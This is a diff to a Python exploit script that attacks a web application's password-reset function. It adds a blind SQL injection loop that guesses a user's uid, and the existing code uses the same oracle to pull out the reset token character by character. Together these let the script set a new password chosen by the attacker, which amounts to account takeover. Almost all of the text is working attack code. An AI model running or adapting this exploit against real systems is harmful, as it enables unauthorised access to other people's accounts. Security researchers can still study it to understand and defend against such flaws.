@@ -7,14 +7,13 @@
 import requests
 import sys
 
-if len(sys.argv) != 5:
-	print('usage: %s TargetIP Username Uid NewPassword' % sys.argv[0])
+if len(sys.argv) != 4:
+	print('usage: %s TargetIP Username NewPassword' % sys.argv[0])
 	sys.exit(-1)
 
 target   = sys.argv[1]
 username = sys.argv[2]
-uid      = sys.argv[3]
-new_pass = sys.argv[4]
+new_pass = sys.argv[3]
 
 def request_reset(username):
 	d = {'username':username}
@@ -47,6 +46,14 @@ if request_reset(username):
 else:
 	print('[-] Failed while requesting password reset.')
 	sys.exit(-1)
+
+sql_template = "(select uid from users where username='%s')"
+uid = 0
+while True:
+	if oracle(sql_template%username,'=',"'%d"%uid):
+		break
+	uid += 1
+print("[+] UID dumped (%d)"%uid)
 
 dumped = ""
 sql_template = "(select ascii(substr(token,%d,1)) from tokens where uid=%s limit 1)"
